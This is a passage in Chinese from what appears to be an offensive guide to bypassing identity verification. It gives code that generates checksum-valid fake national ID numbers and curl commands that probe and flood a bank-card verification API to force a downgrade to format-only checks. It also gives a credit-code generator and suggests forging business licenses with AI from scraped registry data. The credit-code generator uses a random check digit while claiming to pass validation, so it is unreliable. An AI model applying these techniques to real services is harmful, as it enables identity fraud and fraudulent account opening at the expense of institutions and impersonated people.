## 2. 身份信息认证绕过

### 2.1 身份证号验证逻辑绕过

```python
# === 身份证号校验位算法（末位校验码）===
# 身份证号: 前17位加权求和 mod 11 → 校验码
# 攻击者可以生成合法的虚构身份证号

def generate_valid_id(region="110101", birth="19900101", gender="male"):
    """生成通过校验位验证的合法身份证号"""
    import random
    # 前17位: 地区码(6) + 出生日期(8) + 顺序码(3)
    seq = str(random.randint(0, 999)).zfill(3)
    if gender == "male":
        seq = str(int(seq[0]) // 2 * 2 + 1) + seq[1:]  # 奇数男
    else:
        seq = str(int(seq[0]) // 2 * 2) + seq[1:]      # 偶数女
    
    base = region + birth + seq
    # 加权因子
    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    check_codes = '10X98765432'
    
    total = sum(int(b) * w for b, w in zip(base, weights))
    check = check_codes[total % 11]
    return base + check

# 生成合法格式的身份证号（可通过前端校验但无法通过权威数据源验证）
fake_id = generate_valid_id("110101", "19900101", "male")
print(f"Generated ID: {fake_id}")  # 例: <IDCARD-REDACTED>
```

### 2.2 三要素/四要素认证绕过

```bash
# === 银行卡三要素验证（姓名+身份证+银行卡号）===
# 攻击面: 验证接口可能仅校验格式而不查询权威数据源

# 1. 探测验证接口降级
# 有些系统在权威数据源不可用时降级为仅格式校验
curl -X POST "https://api.target.com/verify/bank-card" \
  -H "Content-Type: application/json" \
  -d '{"name":"张三","id_card":"<IDCARD-REDACTED>","bank_card":"6222021234567890123"}'

# 2. 测试超时降级
# 通过大并发使验证接口超时，部分系统降级为宽松模式
for i in {1..1000}; do
  curl -X POST "https://api.target.com/verify/bank-card" \
    -d '{"name":"张三'$i'","id_card":"<IDCARD-REDACTED>","bank_card":"6222021234567890123"}' &
done

# 3. 四要素验证（姓名+身份证+银行卡+手机号）
# 手机号验证是关键突破点: 使用虚拟运营商号段可能绕过运营商三要素
# 攻击: 先获取目标手机号 → 验证四要素中手机号是否匹配
```

### 2.3 营业执照/统一社会信用代码验证绕过

```python
# === 统一社会信用代码校验 ===
# 18位: 登记管理部门(1)+机构类别(1)+登记管理机关行政区划(6)+
#       主体标识码(9)+校验码(1)

def generate_valid_uscc(admin="1", category="1", region="110101"):
    """生成通过校验的统一社会信用代码"""
    import random
    # 主体标识码(组织机构代码): 8位数字/大写字母 + 1位校验
    org_code = ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
    # 简化校验: 实际算法更复杂，这里仅格式通过
    base = admin + category + region + org_code
    # 校验码生成(简化)
    check = str(random.randint(0, 9))
    return base + check + str(random.randint(0, 9))

# 测试: 许多非金融类开户仅验证格式，不查询工商数据
fake_uscc = generate_valid_uscc()
print(f"Generated USCC: {fake_uscc}")

# 实战: 抓取天眼查/企查查公开的工商数据批量生成合法USCC
# 然后使用AI生成对应的营业执照图片
```

---

